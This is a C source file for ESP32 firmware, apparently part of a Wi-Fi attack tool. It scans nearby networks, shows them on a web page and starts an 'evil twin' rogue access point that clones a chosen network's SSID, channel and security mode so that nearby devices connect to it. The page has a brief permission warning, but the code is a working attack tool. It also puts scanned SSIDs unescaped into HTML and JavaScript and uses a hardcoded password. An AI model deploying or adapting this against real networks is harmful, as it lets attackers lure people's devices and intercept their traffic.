#include "rogue_ap.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "main.h"
#include <string.h>
#include <stdio.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "ROGUE_AP";
static bool running = false;
static wifi_config_t default_config;

static void save_default_config(void) {
    esp_wifi_get_config(WIFI_IF_AP, &default_config);
}

void rogue_ap_start(const wifi_ap_record_t *target) {
    if (running) {
        ESP_LOGW(TAG, "Rogue AP already running");
        return;
    }
    
    save_default_config();
    
    wifi_config_t config = {
        .ap = {
            .ssid_len = strlen((char *)target->ssid),
            .channel = target->primary,
            .authmode = target->authmode,
            .max_connection = 4
        }
    };
    memcpy(config.ap.ssid, target->ssid, config.ap.ssid_len);
    strcpy((char *)config.ap.password, "password123");
    
    if (target->authmode == WIFI_AUTH_OPEN) {
        config.ap.authmode = WIFI_AUTH_OPEN;
    }
    
    esp_wifi_set_config(WIFI_IF_AP, &config);
    running = true;
    ESP_LOGI(TAG, "Rogue AP started mimicking %s on channel %d", target->ssid, target->primary);
}

void rogue_ap_stop(void) {
    if (!running) return;
    esp_wifi_set_config(WIFI_IF_AP, &default_config);
    running = false;
    ESP_LOGI(TAG, "Rogue AP stopped");
}

esp_err_t rogue_ap_handler(httpd_req_t *req) {
    ESP_LOGI(TAG, "Rogue AP page requested");
    
    char query[256];
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
        if (strstr(query, "stop=1")) {
            rogue_ap_stop();
            const char *stopped_msg = 
            "<!DOCTYPE html><html><head><title>Rogue AP Stopped</title>"
            "<meta http-equiv='refresh' content='2;url=/wifi_rogue'>"
            "<style>"
            "body { font-family: Arial, sans-serif; background: #0a0f1c; color: #f5c542; padding: 20px; text-align: center; }"
            "</style></head><body>"
            "<h1>&#x2705; Rogue AP Stopped</h1>"
            "<p>Redirecting...</p>"
            "</body></html>";
            httpd_resp_set_type(req, "text/html");
            httpd_resp_send(req, stopped_msg, strlen(stopped_msg));
            return ESP_OK;
        }
        
        if (strstr(query, "start=1")) {
            char *ssid_param = strstr(query, "ssid=");
            if (ssid_param) {
                // Perform scan first
                uint16_t number = DEFAULT_SCAN_LIST_SIZE;
                wifi_ap_record_t ap_info[DEFAULT_SCAN_LIST_SIZE];
                memset(ap_info, 0, sizeof(ap_info));
                
                esp_wifi_scan_start(NULL, true);
                vTaskDelay(pdMS_TO_TICKS(100));
                esp_wifi_scan_get_ap_records(&number, ap_info);
                
                // Extract SSID from query (URL decoded)
                char target_ssid[33] = {0};
                char *ssid_start = ssid_param + 5; // Skip "ssid="
                char *ssid_end = strchr(ssid_start, '&');
                int ssid_len = ssid_end ? (ssid_end - ssid_start) : strlen(ssid_start);
                if (ssid_len > 32) ssid_len = 32;
                strncpy(target_ssid, ssid_start, ssid_len);
                target_ssid[ssid_len] = '\0';
                
                // Find matching AP
                bool found = false;
                for (int i = 0; i < number; i++) {
                    if (strcmp((char *)ap_info[i].ssid, target_ssid) == 0) {
                        rogue_ap_start(&ap_info[i]);
                        found = true;
                        break;
                    }
                }
                
                const char *started_msg = 
                "<!DOCTYPE html><html><head><title>Rogue AP Started</title>"
                "<meta http-equiv='refresh' content='2;url=/wifi_rogue'>"
                "<style>"
                "body { font-family: Arial, sans-serif; background: #0a0f1c; color: #f5c542; padding: 20px; text-align: center; }"
                "</style></head><body>"
                "<h1>%s</h1>"
                "<p>Redirecting...</p>"
                "</body></html>";
                
                char response[512];
                snprintf(response, sizeof(response), started_msg, 
                    found ? "&#x26A1; Rogue AP Started" : "&#x274C; SSID Not Found");
                httpd_resp_set_type(req, "text/html");
                httpd_resp_send(req, response, strlen(response));
                return ESP_OK;
            }
        }
    }
    
    // Build main page
    const char *html_template = 
    "<!DOCTYPE html>"
    "<html lang='en'>"
    "<head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
    "<title>Rogue AP</title>"
    "<style>"
    "body { background: #0a0f1c; color: #f5c542; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; }"
    "h1 { text-align: center; color: #f5c542; }"
    ".container { max-width: 800px; margin: 0 auto; }"
    ".status { padding: 15px; margin: 20px 0; border-radius: 8px; text-align: center; font-weight: bold; }"
    ".status.running { background: #ff4444; color: white; }"
    ".status.stopped { background: #44ff44; color: #0a0f1c; }"
    ".btn { display: inline-block; padding: 12px 20px; margin: 10px 5px; background: #f5c542; color: #0a0f1c; text-decoration: none; font-weight: bold; border-radius: 8px; border: none; cursor: pointer; }"
    ".btn:hover { background: #d4a017; }"
    ".btn.danger { background: #ff4444; color: white; }"
    ".info { background: #1a1f2c; padding: 15px; border-radius: 8px; margin: 20px 0; }"
    "table { width: 100%; border-collapse: collapse; margin-top: 20px; }"
    "th, td { padding: 10px; border: 1px solid #f5c542; text-align: left; }"
    "th { background: #1a1f2c; color: #f5c542; }"
    "tr:nth-child(even) { background: #111111; }"
    ".select-btn { background: #f5c542; color: #0a0f1c; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; font-weight: bold; }"
    "</style>"
    "<script>"
    "function selectNetwork(ssid) {"
    "  if(confirm('Start Rogue AP mimicking: ' + ssid + '?')) {"
    "    window.location.href = '/wifi_rogue?start=1&ssid=' + encodeURIComponent(ssid);"
    "  }"
    "}"
    "</script>"
    "</head>"
    "<body>"
    "<div class='container'>"
    "<h1>&#x1F4E1; Rogue AP</h1>"
    "<div class='status %s'>%s</div>";
    
    const char *status_class = running ? "running" : "stopped";
    const char *status_text = running ? "&#x1F534; ROGUE AP ACTIVE" : "&#x1F7E2; Rogue AP Stopped";
    
    char *page = malloc(16384);
    if (!page) {
        ESP_LOGE(TAG, "Failed to allocate memory");
        const char *error_msg = "<html><body><h1>Memory Error</h1></body></html>";
        httpd_resp_send(req, error_msg, strlen(error_msg));
        return ESP_FAIL;
    }
    
    int offset = 0;
    offset += snprintf(page + offset, 16384 - offset, html_template, status_class, status_text);
    
    if (running) {
        offset += snprintf(page + offset, 16384 - offset,
            "<div class='info'>"
            "<p>&#x26A0; Rogue AP is currently active. Stop it to select a different network.</p>"
            "</div>"
            "<div style='text-align: center;'>"
            "<a href='/wifi_rogue?stop=1' class='btn danger'>&#x23F9; Stop Rogue AP</a>"
            "</div>");
    } else {
        offset += snprintf(page + offset, 16384 - offset,
            "<div class='info'>"
            "<p>&#x1F4E1; <strong>How it works:</strong> Select a network below to create a rogue access point "
            "with the same SSID. Devices may connect to your fake AP instead of the real one.</p>"
            "<p>&#x26A0; <strong>Warning:</strong> Only use on networks you own or have permission to test.</p>"
            "</div>"
            "<h3>&#x1F4E1; Available Networks</h3>");
        
        // Perform scan
        uint16_t number = DEFAULT_SCAN_LIST_SIZE;
        wifi_ap_record_t ap_info[DEFAULT_SCAN_LIST_SIZE];
        memset(ap_info, 0, sizeof(ap_info));
        
        esp_wifi_scan_start(NULL, true);
        vTaskDelay(pdMS_TO_TICKS(100));
        esp_wifi_scan_get_ap_records(&number, ap_info);
        
        offset += snprintf(page + offset, 16384 - offset,
            "<table>"
            "<tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Auth</th><th>Action</th></tr>");
        
        for (int i = 0; i < number && offset < 15000; i++) {
            char bssid[18];
            snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
                ap_info[i].bssid[0], ap_info[i].bssid[1], ap_info[i].bssid[2],
                ap_info[i].bssid[3], ap_info[i].bssid[4], ap_info[i].bssid[5]);
            
            const char *auth;
            switch (ap_info[i].authmode) {
                case WIFI_AUTH_OPEN: auth = "OPEN"; break;
                case WIFI_AUTH_WEP: auth = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: auth = "WPA-PSK"; break;
                case WIFI_AUTH_WPA2_PSK: auth = "WPA2-PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2"; break;
                case WIFI_AUTH_WPA3_PSK: auth = "WPA3-PSK"; break;
                default: auth = "OTHER"; break;
            }
            
            offset += snprintf(page + offset, 16384 - offset,
                "<tr><td>%s</td><td>%s</td><td>%d</td><td>%d dBm</td><td>%s</td>"
                "<td><button class='select-btn' onclick=\"selectNetwork('%s')\">Select</button></td></tr>",
                strlen((char *)ap_info[i].ssid) > 0 ? (char *)ap_info[i].ssid : "&lt;hidden&gt;",
                bssid,
                ap_info[i].primary,
                ap_info[i].rssi,
                auth,
                (char *)ap_info[i].ssid);
        }
        
        offset += snprintf(page + offset, 16384 - offset, "</table>");
    }
    
    offset += snprintf(page + offset, 16384 - offset,
        "<div style='text-align: center; margin-top: 30px;'>"
        "<a href='/' class='btn'>&#x2B05; Back to Main Menu</a>"
        "</div>"
        "</div>"
        "</body>"
        "</html>");
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, page, strlen(page));
    free(page);
    
    return ESP_OK;
}